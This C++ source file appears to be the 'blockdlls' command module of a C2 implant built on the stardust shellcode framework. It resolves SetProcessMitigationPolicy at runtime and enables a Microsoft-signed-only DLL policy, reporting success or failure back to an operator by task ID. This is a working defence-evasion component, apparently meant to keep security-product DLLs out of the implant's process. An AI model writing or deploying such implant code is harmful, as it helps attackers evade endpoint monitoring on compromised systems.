#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_BLOCKDLLS

using namespace stardust;
using namespace starburst;

#ifndef ProcessSignaturePolicy
#define ProcessSignaturePolicy 8
#endif

typedef BOOL ( WINAPI *fn_SetProcessMitigationPolicy )( int, PVOID, SIZE_T );

auto declfn starburst::cmd_blockdlls(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t enable = parser_int32( params );

    DBG_PRINT( inst, "cmd_blockdlls: enable=%u\n", enable );

    auto k32 = inst.kernel32.handle;

    auto pSetProcessMitigationPolicy = reinterpret_cast<fn_SetProcessMitigationPolicy>(
        inst.kernel32.GetProcAddress( (HMODULE)k32,
            symbol<LPCSTR>( "SetProcessMitigationPolicy" ) ) );

    if ( !pSetProcessMitigationPolicy ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to resolve SetProcessMitigationPolicy" ) ) );
        return;
    }

    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY policy = {};
    if ( enable ) {
        policy.MicrosoftSignedOnly = 1;
    } else {
        policy.MicrosoftSignedOnly = 0;
    }

    BOOL ok = pSetProcessMitigationPolicy(
        ProcessSignaturePolicy, &policy, sizeof( policy ) );

    if ( ok ) {
        if ( enable ) {
            queue_response( inst, task_uuid, RESPONSE_SUCCESS,
                symbol<char*>( const_cast<char*>( "block non-Microsoft DLLs enabled" ) ) );
        } else {
            queue_response( inst, task_uuid, RESPONSE_SUCCESS,
                symbol<char*>( const_cast<char*>( "block non-Microsoft DLLs disabled" ) ) );
        }
    } else {
        char msg[96] = { 0 };
        str_copy( msg, symbol<char*>( const_cast<char*>( "SetProcessMitigationPolicy failed, error " ) ) );
        char num[16];
        int_to_str( num, inst.kernel32.GetLastError(), 10 );
        str_concat( msg, num );
        queue_response( inst, task_uuid, RESPONSE_ERROR, msg );
    }
}

#endif
